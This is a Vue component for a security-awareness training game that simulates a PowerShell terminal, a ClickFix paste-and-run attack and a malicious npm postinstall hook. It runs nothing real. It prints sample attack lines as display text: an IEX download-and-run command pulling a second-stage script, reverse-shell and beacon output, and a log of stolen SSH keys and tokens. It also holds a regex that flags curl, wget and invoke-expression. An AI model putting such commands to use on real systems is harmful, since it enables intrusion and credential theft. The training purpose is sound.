<template>
  <div class="flex flex-col h-full bg-[#0c0c14] text-[13px] font-mono p-4 overflow-hidden">
    <div class="text-slate-500 mb-1">Microsoft PowerShell [Version 7.4.2]</div>
    <div class="text-slate-600 mb-4">(c) Microsoft Corporation. All rights reserved.</div>

    <div ref="scrollEl" class="flex-1 overflow-y-auto">
      <div v-for="(l, i) in lines" :key="i" :class="l.cls" class="leading-relaxed whitespace-pre-wrap">{{ l.text }}</div>

      <div class="flex items-center gap-2 mt-1">
        <span class="text-sky-400 flex-shrink-0">PS C:\Users\s.alharthi&gt;</span>
        <input
          ref="inputEl"
          v-model="input"
          class="flex-1 bg-transparent outline-none text-slate-100 font-mono"
          spellcheck="false"
          autocomplete="off"
          :disabled="busy"
          @paste="onPaste"
          @keydown.enter="submit"
        />
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import emitter from '~/components/misc/eventHandler'

const session = useSessionStore()

const input = ref('')
const busy = ref(false)
const inputEl = ref<HTMLInputElement | null>(null)
const scrollEl = ref<HTMLElement | null>(null)
const lines = ref<{ text: string; cls: string }[]>([])

const PROMPT = 'PS C:\\Users\\s.alharthi> '

function push(text: string, cls = '') {
  lines.value.push({ text, cls })
  nextTick(() => scrollEl.value?.scrollTo({ top: scrollEl.value.scrollHeight }))
}

const wait = (ms: number) => new Promise((r) => setTimeout(r, ms))

function onPaste(e: ClipboardEvent) {
  e.preventDefault()
  // the simulated OS clipboard is what the fake verification page hijacked
  const sim = session.clipboard
  if (sim && !busy.value) {
    input.value += sim
    session.log('PASTED', 'clipboard content pasted into terminal', 'risky')
  }
}

function submit() {
  const cmd = input.value.trim()
  if (!cmd || busy.value) return
  push(PROMPT + cmd, 'text-slate-100')
  input.value = ''
  run(cmd)
}

function run(cmd: string) {
  if (busy.value) return
  const name = cmd.split(/\s+/)[0]
  if (/^(npm|npx|pnpm|yarn)(\.cmd)?$/i.test(name)) { npm(cmd); return }
  const malicious = /powershell|\.ps1|iwr|curl|wget|cmd\.exe|invoke-expression/i.test(cmd)
  session.log('COMMAND_EXECUTED', cmd, malicious ? 'risky' : 'neutral')
  // only the ClickFix page's own command does anything; elsewhere it is just a mistyped command
  if (malicious && session.scenarioId === 'clickfix') {
    session.flag('ran_command')
    attackSequence(cmd)
  } else {
    push(`${cmd.split(/\s+/)[0]} : The term '${cmd.split(/\s+/)[0]}' is not recognized as a name of a cmdlet.`, 'text-rose-300')
  }
}

// ---------- npm (ironcastle) ----------
const PKG = 'ironcastle-code'
const ERR = 'text-rose-300'

// the package is known from the moment its message is in the mailbox until that play is handled
function pkgReachable() {
  return session.activeScenarios.includes('ironcastle') && (session.scenarioId === 'ironcastle' || !session.completedScenarios.includes('ironcastle'))
}
function enterIroncastle() {
  session.focusScenario('ironcastle')
}
function out(block: string, cls = 'text-slate-300') {
  block.split('\n').forEach((l) => push(l, cls))
}

const VIEW = `${PKG}@4.8.2 | MIT | deps: 3 | versions: 3
Frontier models from your terminal.
https://ironcastle.ai

bin: ironcastle

dependencies:
chalk: ^5.3.0  commander: ^12.1.0  undici: ^6.19.2

maintainers:
- ironcastle-release <release@ironcastle.ai>

published 3 days ago by ironcastle-release <release@ironcastle.ai>`

async function npm(cmd: string) {
  // a session that ends or restarts mid-command must not be touched by its tail
  const rid = session.runId
  const tick = async (ms: number) => { await wait(ms); return session.runId === rid }
  const args = cmd.split(/\s+/).slice(1)
  const verb = (args[0] || '').toLowerCase()
  const flags = args.filter((a) => a.startsWith('-')).map((a) => a.toLowerCase())
  const targets = args.slice(1).filter((a) => !a.startsWith('-'))
  const known = targets.some((t) => t.replace(/@.*$/, '') === PKG) && pkgReachable()
  busy.value = true
  const finish = () => { busy.value = false; nextTick(() => inputEl.value?.focus()) }

  if (['i', 'install', 'add'].includes(verb) && targets.length) {
    if (!known) {
      if (!(await tick(800))) return
      out(`npm error code E404\nnpm error 404 '${targets[0]}' is not in this registry.`, ERR)
      session.log('COMMAND_EXECUTED', cmd.slice(0, 80), 'neutral')
      return finish()
    }
    enterIroncastle()
    if (flags.includes('--dry-run')) {
      if (!(await tick(1000))) return
      out(`add ${PKG} 4.8.2\n\nadded 47 packages in 1s`)
      session.log('INSTALL_DRY_RUN', 'ran the install with --dry-run: nothing was written or executed', 'safe')
      session.timelineStep('You ran the install as a dry run, which executes nothing')
      finish()
      enterIroncastle(); session.survive()
      return
    }
    const ignore = flags.includes('--ignore-scripts')
    session.log('COMMAND_EXECUTED', cmd.slice(0, 80), ignore ? 'neutral' : 'risky')
    if (!ignore) {
      session.flag('ran_command')
      session.log('PACKAGE_INSTALL_EXECUTED', `${PKG}@4.8.2`, 'risky')
      session.timelineStep('You ran the install command', true)
      session.c2Start()
      session.c2Log('[hook] postinstall started inside npm install -g ironcastle-code', 'text-emerald-300', 'node spawning a shell during npm install, with network access, from a global install', 'Install with --ignore-scripts and use an internal allow-list')
    }
    if (!(await tick(1900))) return
    push("npm warn deprecated node-domexception@1.0.0: Use your platform's native DOMException instead", 'text-amber-300')
    if (!(await tick(2400))) return
    out('\nadded 47 packages in 4s\n\n23 packages are looking for funding\n  run `npm fund` for details')
    if (ignore) {
      enterIroncastle(); session.flag('ignored_scripts')
      session.log('INSTALL_SCRIPTS_IGNORED', 'installed with --ignore-scripts: the hook never ran', 'safe')
      session.timelineStep('You installed it with install scripts switched off, so its hook never ran')
      finish()
      enterIroncastle(); session.survive()
      return
    }
    // nothing looks wrong. The hook already ran.
    enterIroncastle(); session.flag('ironcastle_installed')
    finish()
    if (!(await tick(1600))) return
    session.timelineStep('npm reported a clean install')
    session.c2Log('[+] ~/.npmrc token, SSH key and 3 .env files read and sent out', 'text-rose-400', 'A package install process reading ~/.ssh and .env files, then connecting to a host that is not the registry', 'Short-lived, scoped publish tokens')
    session.c2Log('[+] publish token valid: the next release of this package carries the same hook', 'text-rose-400')
    enterIroncastle(); session.compromise('A script inside the package ran during the install and copied this machine\u2019s developer credentials', false)
    return
  }

  if (['view', 'info', 'show', 'v'].includes(verb) && known) {
    enterIroncastle()
    if (!(await tick(600))) return
    const field = targets.find((t) => t.replace(/@.*$/, '') !== PKG)
    if (field === 'scripts') out(`{ postinstall: 'node ./scripts/bootstrap.js' }`)
    else if (field === 'maintainers') out('ironcastle-release <release@ironcastle.ai>')
    else if (field) out('')
    else out(VIEW)
    session.log('PACKAGE_INSPECTED', field ? `npm view ${PKG} ${field}` : `npm view ${PKG}`, 'safe')
    session.timelineStep('You asked the registry about the package before installing it')
    finish()
    enterIroncastle(); session.survive()
    return
  }

  if (verb === 'pack' && known) {
    enterIroncastle()
    if (!(await tick(900))) return
    out(`npm notice package: ${PKG}@4.8.2\nnpm notice 38.2kB scripts/bootstrap.js\nnpm notice total files: 5\n${PKG}-4.8.2.tgz`)
    // fetching the tarball runs nothing: a safe way to read what is inside
    session.log('PACKAGE_PACKED', 'downloaded the tarball without installing it', 'safe')
    session.timelineStep('You downloaded the package without running it')
    finish()
    enterIroncastle(); session.survive()
    return
  }

  if (!(await tick(300))) return
  if (!verb || ['help', '--help', '-h'].includes(verb)) {
    out('npm <command>\n\nnpm install <foo>  add the <foo> dependency\nnpm view <foo>     show what the registry knows about <foo>\nnpm pack <foo>     download <foo> as a tarball without installing it')
  } else if (['view', 'info', 'show', 'v', 'pack'].includes(verb)) {
    out(`npm error code E404\nnpm error 404 '${targets[0] ?? ''}' is not in this registry.`, ERR)
  } else {
    out('up to date in 731ms')
  }
  session.log('COMMAND_EXECUTED', cmd.slice(0, 80), 'neutral')
  finish()
}

async function attackSequence(cmd: string) {
  busy.value = true
  session.timelineStep('Command pasted and executed → payload fetched')
  push(PROMPT + cmd, 'text-slate-100')
  push('', '')
  push('  % Total   % Received  Time     Speed', 'text-slate-500')
  await wait(120)
  push('  uv.ps1    4.2 KB    4.2 KB   0:00    810 KB/s', 'text-slate-300')

  if (session.scenarioId === 'clickfix') {
    // the user's command + its reassuring comment, echoed exactly as pasted —
    // real ClickFix windows flash for ~2 seconds before -w hidden kills them
    await wait(120)
    push('  # note: everything after "#" is a comment — it never runs', 'text-slate-500')
    await wait(140)
    push('  → uv.ps1 — the payload you just ran:', 'text-amber-300')
    const payload = [
      "  Add-Type -AssemblyName System.Windows.Forms       # GUI",
      "  $form.Text = 'Cloudflare Security Challenge'       # fake window",
      "  IEX(dl('https://cdn.wadigate-support-cdn.com/s2.ps1'))# stage 2 beacon",
    ]
    for (const l of payload) {
      await wait(110)
      push(l, 'text-slate-400')
    }
    await wait(150)
    push('  → executing payload (iex)…', 'text-rose-300')
    await wait(250)
    // "-w hidden" is doing its job: the window closes itself mid-run
    push('  → -w hidden: this window disappears now', 'text-rose-300')
    await wait(350)
    useOpenWindowsStore().closeWindow('Terminal')
    session.coach('The command closed its own window — that is what "-w hidden" means. It is still running.')

    // payload theatre: fake Cloudflare form pops up, C2 side panel lights up.
    // the form component finishes the story (compromise on OK / auto)
    session.timelineStep('Fake Cloudflare "verification" window distracts the user')
    session.payloadRunning = true
    session.c2Start()
    session.c2Log('listening on 203.0.113.66:443', 'text-emerald-300')
    session.c2Log('payload launched on WG-LT-0441 — fake Cloudflare form on screen', 'text-slate-300', 'explorer.exe starting powershell.exe with -w hidden and a download-and-run string', 'Block Win+R and restrict PowerShell for standard users')
    return
  }

  // legacy sequence for any other scenario path
  const seq: { text: string; cls: string }[] = [
    { text: '  → script loaded (' + cmd.length + ' byte command)', cls: 'text-slate-400' },
    { text: '  [beacon] POST cdn.wadigate-support-cdn.com ... ALIVE', cls: 'text-rose-400' },
    { text: '  [beacon] reverse shell connected → 203.0.113.66:443', cls: 'text-rose-400' },
    { text: '  [attacker] whoami → WG-LT-0441\\s.alharthi', cls: 'text-rose-400' },
    { text: '  [attacker] waking up remote operator console…', cls: 'text-rose-400' },
  ]
  for (const l of seq) {
    await wait(600)
    push(l.text, l.cls)
  }
  await wait(800)
  session.timelineStep('Attacker foothold established on workstation')
  session.compromise('Workstation command executed from web page', false)
}

onMounted(() => {
  emitter.on('terminalExec', (cmd: string) => {
    push(PROMPT + cmd, 'text-slate-100')
    run(cmd)
  })
  nextTick(() => inputEl.value?.focus())
})

onUnmounted(() => emitter.off('terminalExec'))
</script>
